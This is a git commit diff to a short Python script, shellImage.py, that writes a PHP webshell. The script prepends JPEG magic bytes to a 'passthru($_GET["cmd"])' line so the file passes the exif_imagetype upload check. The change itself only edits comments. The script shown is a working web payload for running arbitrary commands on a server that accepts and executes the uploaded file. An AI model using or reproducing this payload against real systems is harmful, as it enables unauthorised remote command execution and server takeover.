e6c139f04ec569a4f1d1478a5eeb39c7a356be93
Alessandra  Zullo <alessandra.zullo1@gmail.com>
2018-06-06 12:37:14 +0200

    ok
    ok

--- shellImage.py
+++ shellImage.py
@@ -1,11 +1,8 @@
 # Script Name		: shellImage.py
 # Author				: Alessandra Zullo
 # Created				: Ottobre 2017
-# Last Modified		: null
 # Version				: 0.1
-
-
-# Description			: Create a webshell (php) that bypass exif_imagetype function that checks the type of upload's file.
+# Description		: Create a webshell (php) that bypass exif_imagetype. THis function that checks the type of upload's file.
 fh = open('webshell.php', 'w')
 fh.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
 fh.close()
